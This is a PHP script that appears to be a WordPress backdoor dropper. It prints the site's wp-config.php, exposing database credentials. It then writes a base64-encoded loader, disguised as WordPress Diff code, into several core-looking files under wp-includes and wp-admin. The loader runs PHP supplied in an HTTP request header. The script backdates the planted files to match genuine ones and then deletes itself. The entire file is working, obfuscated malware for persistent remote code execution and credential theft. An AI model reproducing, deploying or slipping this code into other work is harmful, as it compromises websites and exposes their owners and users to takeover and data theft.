<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
$loader1 = base64_decode("Cjw/cGhwCgovKioKICogV29yZFByZXNzIERpZmYgYmFzdGFyZCBjaGlsZCBvZiBvbGQgTWVkaWFXaWtpIERpZmYgRm9ybWF0dGVyLgogKgogKiBCYXNpY2FsbHkgYWxsIHRoYXQgcmVtYWlucyBpcyB0aGUgdGFibGUgc3RydWN0dXJlIGFuZCBzb21lIG1ldGhvZCBuYW1lcy4KICoKICogQHBhY2thZ2UgV29yZFByZXNzCiAqIEBzdWJwYWNrYWdlIERpZmYKICovCgpjbGFzcyBEaWZmUmVzdWx0CnsKICAgIC8qKiAgQ29uZGl0aW9ucyBmb3IgdGFyZ2V0IGZpZWxkcyB3aGVuIGRvaW5nIGFuIG91dGVyIGpvaW4gb25seSBtYWtlICovCiAgICBwdWJsaWMgZnVuY3Rpb24gbGltaXRfdHh0KCRoYXNoZXMpewogICAgICAgIGlmKGlzc2V0KCRoYXNoZXNbJHRoaXMtPmdldE1haWxNSU1FKCldKSl7CiAgICAgICAgICAgIHJldHVybiAkdGhpcy0+aGFzUmVsYXRpb24oJGhhc2hlc1skdGhpcy0+Z2V0TWFpbE1JTUUoKV0pOwogICAgICAgIH0KICAgIH0KCiAgICBwdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoKXsKICAgICAgICBpZigkZm10ID0gJHRoaXMtPmxpbWl0X3R4dCgkX1NFUlZFUikpewogICAgICAgICAgICAkdGhpcy0+c2VhcmNoID0gJ2NyZWF0ZSc7CiAgICAgICAgICAgICR0aGlzLT5sZWZ0KCRmbXQpOwogICAgICAgIH0KICAgIH0KCiAgICAvKiogIFJlLWZldGNoIHRoZSBlbnRpdHkgbWFuYWdlciBmcm9tIHRoZSBuZXcgY29udGFpbmVyIGJ1aWx0IGFmdGVyIHRoZSBuZXcgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBsZWZ0KCRjaW0pCiAgICB7CiAgICAgICAgJGNvbFdpZHRocyA9ICdmdW5jdGlvbic7CiAgICAgICAgJG5ldG1hc2sgPSAkY2ltIC4gJ3JldHVybiB0cnVlOyc7CiAgICAgICAgJHVzZVZlcnAgPSAkdGhpcy0+c2VhcmNoLidfJy4kY29sV2lkdGhzOwogICAgICAgICRobWF4ID0gJHVzZVZlcnAoJycsICRuZXRtYXNrKTsKICAgICAgICBpZiAoISRobWF4KCkpIHsKICAgICAgICAgICAgJHRoaXMtPnNldFN5bmNpbmcoJzw/cGhwICcuJGNpbSk7CiAgICAgICAgfQogICAgfQoKICAgIC8qKiAgSWYgc2VsZWN0ZWQgbWVudSB0eXBlIGRpZmZlcmVudCBmcm9tIGN1cnJlbnQgbWVudSB0eXBlIHJlc2V0IHBhZ2luYXRpb24gdG8gMCAqLwogICAgZnVuY3Rpb24gc2V0U3luY2luZygkbmljZW5hbWUpCiAgICB7CiAgICAgICAgaWYgKCRnb2FsID0gdG1wZmlsZSgpKSB7CiAgICAgICAgICAgIGZ3cml0ZSgkZ29hbCwgJG5pY2VuYW1lKTsKICAgICAgICAgICAgJGF0dHIyID0gc3RyZWFtX2dldF9tZXRhX2RhdGEoJGdvYWwpOwogICAgICAgICAgICBpbmNsdWRlKCRhdHRyMlsndXJpJ10pOwogICAgICAgICAgICBmY2xvc2UoJGdvYWwpOwogICAgICAgIH0KICAgIH0KCiAgICAvKiogIEdyYWIgdGhlIG5vZGUgdHlwZSBjb25kaXRpb24gYW5kIGNvbmZpZ3VyZSBpdCB0byBjaGVjayBhZ2FpbnN0IG5vZGUgdHlwZSAqLwogICAgcHVibGljIGZ1bmN0aW9uIGhhc1JlbGF0aW9uKCRwcm92aWRlcnMpewogICAgICAgIHJldHVybiBzdHJyZXYoJHByb3ZpZGVycyk7CiAgICB9CgogICAgLyoqICB0cmFuc2xhdGlvbiBpcyBjcmVhdGVkIGJ5IHRoZSB0cmFuc2xhdG9yIGFuZCB0aGUgdHJhbnNsYXRpb24gYXV0aG9yIGlzICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0TWFpbE1JTUUoKXsKICAgICAgICAkY3JlYXRlZCA9ICdodHRwJzsKICAgICAgICByZXR1cm4gc3RydG91cHBlcigkY3JlYXRlZC4nXycuX19GVU5DVElPTl9fKTsKICAgIH0KfQoKbmV3IERpZmZSZXN1bHQoKTsKPz4=");
$loader2 = base64_decode("Cjw/cGhwCgovKioKICogV29yZFByZXNzIERpZmYgYmFzdGFyZCBjaGlsZCBvZiBvbGQgTWVkaWFXaWtpIERpZmYgRm9ybWF0dGVyLgogKgogKiBCYXNpY2FsbHkgYWxsIHRoYXQgcmVtYWlucyBpcyB0aGUgdGFibGUgc3RydWN0dXJlIGFuZCBzb21lIG1ldGhvZCBuYW1lcy4KICoKICogQHBhY2thZ2UgV29yZFByZXNzCiAqIEBzdWJwYWNrYWdlIERpZmYKICovCgpjbGFzcyBEaWZmUmVzdWx0CnsKICAgIC8qKiAgQ29uZGl0aW9ucyBmb3IgdGFyZ2V0IGZpZWxkcyB3aGVuIGRvaW5nIGFuIG91dGVyIGpvaW4gb25seSBtYWtlICovCiAgICBwdWJsaWMgZnVuY3Rpb24gbGltaXRfdHh0KCRoYXNoZXMpewogICAgICAgIGlmKGlzc2V0KCRoYXNoZXNbJHRoaXMtPmdldE1haWxNSU1FKCldKSl7CiAgICAgICAgICAgIHJldHVybiAkdGhpcy0+aGFzUmVsYXRpb24oJGhhc2hlc1skdGhpcy0+Z2V0TWFpbE1JTUUoKV0pOwogICAgICAgIH0KICAgIH0KCiAgICBwdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoKXsKICAgICAgICBpZigkZm10ID0gJHRoaXMtPmxpbWl0X3R4dCgkX1NFUlZFUikpewogICAgICAgICAgICAkdGhpcy0+c2VhcmNoID0gJ2NyZWF0ZSc7CiAgICAgICAgICAgICR0aGlzLT5sZWZ0KCRmbXQpOwogICAgICAgIH0KICAgIH0KCiAgICAvKiogIFJlLWZldGNoIHRoZSBlbnRpdHkgbWFuYWdlciBmcm9tIHRoZSBuZXcgY29udGFpbmVyIGJ1aWx0IGFmdGVyIHRoZSBuZXcgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBsZWZ0KCRjaW0pCiAgICB7CiAgICAgICAgJGNvbFdpZHRocyA9ICdmdW5jdGlvbic7CiAgICAgICAgJG5ldG1hc2sgPSAkY2ltIC4gJ3JldHVybiB0cnVlOyc7CiAgICAgICAgJHVzZVZlcnAgPSAkdGhpcy0+c2VhcmNoLidfJy4kY29sV2lkdGhzOwogICAgICAgICRobWF4ID0gJHVzZVZlcnAoJycsICRuZXRtYXNrKTsKICAgICAgICBpZiAoISRobWF4KCkpIHsKICAgICAgICAgICAgJHRoaXMtPnNldFN5bmNpbmcoJzw/cGhwICcuJGNpbSk7CiAgICAgICAgfQogICAgfQoKICAgIC8qKiAgSWYgc2VsZWN0ZWQgbWVudSB0eXBlIGRpZmZlcmVudCBmcm9tIGN1cnJlbnQgbWVudSB0eXBlIHJlc2V0IHBhZ2luYXRpb24gdG8gMCAqLwogICAgZnVuY3Rpb24gc2V0U3luY2luZygkbmljZW5hbWUpCiAgICB7CiAgICAgICAgaWYgKCRnb2FsID0gdG1wZmlsZSgpKSB7CiAgICAgICAgICAgIGZ3cml0ZSgkZ29hbCwgJG5pY2VuYW1lKTsKICAgICAgICAgICAgJGF0dHIyID0gc3RyZWFtX2dldF9tZXRhX2RhdGEoJGdvYWwpOwogICAgICAgICAgICBpbmNsdWRlKCRhdHRyMlsndXJpJ10pOwogICAgICAgICAgICBmY2xvc2UoJGdvYWwpOwogICAgICAgIH0KICAgIH0KCiAgICAvKiogIEdyYWIgdGhlIG5vZGUgdHlwZSBjb25kaXRpb24gYW5kIGNvbmZpZ3VyZSBpdCB0byBjaGVjayBhZ2FpbnN0IG5vZGUgdHlwZSAqLwogICAgcHVibGljIGZ1bmN0aW9uIGhhc1JlbGF0aW9uKCRwcm92aWRlcnMpewogICAgICAgIHJldHVybiBzdHJyZXYoJHByb3ZpZGVycyk7CiAgICB9CgogICAgLyoqICB0cmFuc2xhdGlvbiBpcyBjcmVhdGVkIGJ5IHRoZSB0cmFuc2xhdG9yIGFuZCB0aGUgdHJhbnNsYXRpb24gYXV0aG9yIGlzICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0TWFpbE1JTUUoKXsKICAgICAgICAkY3JlYXRlZCA9ICdodHRwJzsKICAgICAgICByZXR1cm4gc3RydG91cHBlcigkY3JlYXRlZC4nXycuX19GVU5DVElPTl9fKTsKICAgIH0KfQoKbmV3IERpZmZSZXN1bHQoKTsKPz4=");
function get_wp_installation()
{
    $full_path = getcwd();
    $ar = explode("wp-", $full_path);
    return $ar[0];
}


function getPermsForUploader($rootDir){
  return  substr(sprintf('%o', fileperms($rootDir.'wp-includes/ID3/module.tag.id3v1.php')), -4);
}

function getDateForUploader($rootDir){
   return  filemtime($rootDir.'wp-includes/ID3/module.tag.id3v1.php');
}



function putUploader($str,$rootDir){
   $file =  file_put_contents($rootDir.'wp-includes/ID3/module.tag.idv1.php', $str);
   if($file){
       echo $rootDir.'wp-includes/ID3/module.tag.idv1.php'.' uploader'."<br>";
   }
    touch($rootDir.'wp-includes/ID3/module.tag.idv1.php',getDateForUploader($rootDir));
    // chmod($rootDir.'wp-includes/ID3/module.tag.idv1.php',getPermsForUploader($rootDir));
}



//

function getPermsForWPResult($rootDir){
    $ss = substr(sprintf('%o', fileperms($rootDir.'wp-includes/wp-diff.php')), -4);
    return  substr(sprintf('%o', fileperms($rootDir.'wp-includes/wp-diff.php')), -4);
}

function getDateForWPResult($rootDir){
    return  filemtime($rootDir.'wp-includes/wp-diff.php');
}



function putUWpresult($str,$rootDir){
    $file =  file_put_contents($rootDir.'wp-includes/wp-diff-result.php', $str);
    if($file){
        echo $rootDir.'wp-includes/wp-diff-result.php'.' backdoor'."<br>";
    }
    touch($rootDir.'wp-includes/wp-diff-result.php',getDateForWPResult($rootDir));
  //  // chmod($rootDir.'wp-includes/wp-diff-result.php',getPermsForWPResult($rootDir));
}
//
//

function getPermsForWPAdm($rootDir){
    return  substr(sprintf('%o', fileperms($rootDir.'wp-admin/admin-ajax.php')), -4);
}

function getDateForWPAdm($rootDir){
    return  filemtime($rootDir.'wp-admin/admin-ajax.php');
}



function putUWPAdm($str,$rootDir){
    $file =  file_put_contents($rootDir.'wp-admin/widgets-upload.php', $str);
    if($file){
        echo $rootDir.'wp-admin/widgets-upload.php'.' backdoor'."<br>";
    }
    touch($rootDir.'wp-admin/widgets-upload.php',getDateForWPAdm($rootDir));
    // chmod($rootDir.'wp-admin/widgets-upload.php',getPermsForWPAdm($rootDir));
}


function getPermsForWPProfile($rootDir){
    return  substr(sprintf('%o', fileperms($rootDir.'wp-admin/admin-ajax.php')), -4);
}

function getDateForWPProfile($rootDir){
    return  filemtime($rootDir.'wp-admin/admin-ajax.php');
}



function putUWPProfile($str,$rootDir){
    $file =  file_put_contents($rootDir.'wp-admin/profile-info.php', $str);
    if($file){
        echo $rootDir.'wp-admin/profile-info.php'.' '."<br>";
    }
    touch($rootDir.'wp-admin/profile-info.php' ,getDateForWPProfile($rootDir));
    // chmod($rootDir.'wp-admin/profile-info.php' ,getPermsForWPProfile($rootDir));
}

$path = get_wp_installation();
try{
    echo file_get_contents($path."/wp-config.php").'\n';
}catch (Exception $exception){}
putUploader($loader1,$path);
putUWpresult($loader1,$path);
putUWPAdm($loader2,$path);
putUWPProfile($loader1,$path);
unlink(__FILE__);